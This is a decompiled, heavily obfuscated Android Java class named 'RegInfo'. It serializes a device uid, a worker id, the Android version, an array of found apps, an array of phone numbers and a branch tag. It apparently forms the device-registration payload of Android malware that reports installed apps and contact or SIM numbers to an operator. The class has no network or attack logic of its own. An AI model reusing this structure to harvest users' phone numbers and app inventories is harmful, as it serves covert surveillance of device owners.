package com.vdodsodjsdt;

import android.os.Build;
import java.util.Arrays;

/* JADX INFO: compiled from: r8-map-id-3f77bbef96f83a8bf86e140490b9d41fcf0723d2c79bd2f3f370cb94135e1be4 */
/* JADX INFO: loaded from: classes.dex */
public final class wZY0YUvfdRUkPh3N {

    @gONlSwuqWpO("phone_numbers")
    private final String[] LaeGQIruHQu81hfJldjMOQSVblH3x;

    @gONlSwuqWpO("android_version")
    private final String V57tEvNfxZVVcOCAOih5PKr;

    @gONlSwuqWpO("uid")
    private final String VxUQ9tBhpHJ2AAEDNW8sghc4m;

    @gONlSwuqWpO("found_apps")
    private final String[] ZfQNn8hdWlEQ5cR94249PDsLR;

    @gONlSwuqWpO("branch")
    private final String zIvmSL0wzmmKGc3X39b2Gw2mUGE;

    @gONlSwuqWpO("worker")
    private final String zzpBGItXfub0yWj;

    public wZY0YUvfdRUkPh3N(String str, String str2, String[] strArr, String[] strArr2, String str3) {
        String str4 = Build.VERSION.RELEASE;
        ej6unYlOWMDF.pYmKDYlAmhudp(str, "uid");
        ej6unYlOWMDF.pYmKDYlAmhudp(str4, "android_version");
        ej6unYlOWMDF.pYmKDYlAmhudp(strArr, "found_apps");
        ej6unYlOWMDF.pYmKDYlAmhudp(str3, "branch");
        this.VxUQ9tBhpHJ2AAEDNW8sghc4m = str;
        this.zzpBGItXfub0yWj = str2;
        this.V57tEvNfxZVVcOCAOih5PKr = str4;
        this.ZfQNn8hdWlEQ5cR94249PDsLR = strArr;
        this.LaeGQIruHQu81hfJldjMOQSVblH3x = strArr2;
        this.zIvmSL0wzmmKGc3X39b2Gw2mUGE = str3;
    }

    public final boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (!(obj instanceof wZY0YUvfdRUkPh3N)) {
            return false;
        }
        wZY0YUvfdRUkPh3N wzy0yuvfdrukph3n = (wZY0YUvfdRUkPh3N) obj;
        return ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(this.VxUQ9tBhpHJ2AAEDNW8sghc4m, wzy0yuvfdrukph3n.VxUQ9tBhpHJ2AAEDNW8sghc4m) && ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(this.zzpBGItXfub0yWj, wzy0yuvfdrukph3n.zzpBGItXfub0yWj) && ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(this.V57tEvNfxZVVcOCAOih5PKr, wzy0yuvfdrukph3n.V57tEvNfxZVVcOCAOih5PKr) && ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(this.ZfQNn8hdWlEQ5cR94249PDsLR, wzy0yuvfdrukph3n.ZfQNn8hdWlEQ5cR94249PDsLR) && ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(this.LaeGQIruHQu81hfJldjMOQSVblH3x, wzy0yuvfdrukph3n.LaeGQIruHQu81hfJldjMOQSVblH3x) && ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(this.zIvmSL0wzmmKGc3X39b2Gw2mUGE, wzy0yuvfdrukph3n.zIvmSL0wzmmKGc3X39b2Gw2mUGE);
    }

    public final int hashCode() {
        return this.zIvmSL0wzmmKGc3X39b2Gw2mUGE.hashCode() + ((((u9SlVAuoWhQUfJ.LaeGQIruHQu81hfJldjMOQSVblH3x(this.V57tEvNfxZVVcOCAOih5PKr, u9SlVAuoWhQUfJ.LaeGQIruHQu81hfJldjMOQSVblH3x(this.zzpBGItXfub0yWj, this.VxUQ9tBhpHJ2AAEDNW8sghc4m.hashCode() * 31, 31), 31) + Arrays.hashCode(this.ZfQNn8hdWlEQ5cR94249PDsLR)) * 31) + Arrays.hashCode(this.LaeGQIruHQu81hfJldjMOQSVblH3x)) * 31);
    }

    public final String toString() {
        return "RegInfo(uid=" + this.VxUQ9tBhpHJ2AAEDNW8sghc4m + ", worker=" + this.zzpBGItXfub0yWj + ", android_version=" + this.V57tEvNfxZVVcOCAOih5PKr + ", found_apps=" + Arrays.toString(this.ZfQNn8hdWlEQ5cR94249PDsLR) + ", phone_numbers=" + Arrays.toString(this.LaeGQIruHQu81hfJldjMOQSVblH3x) + ", branch=" + this.zIvmSL0wzmmKGc3X39b2Gw2mUGE + ")";
    }
}
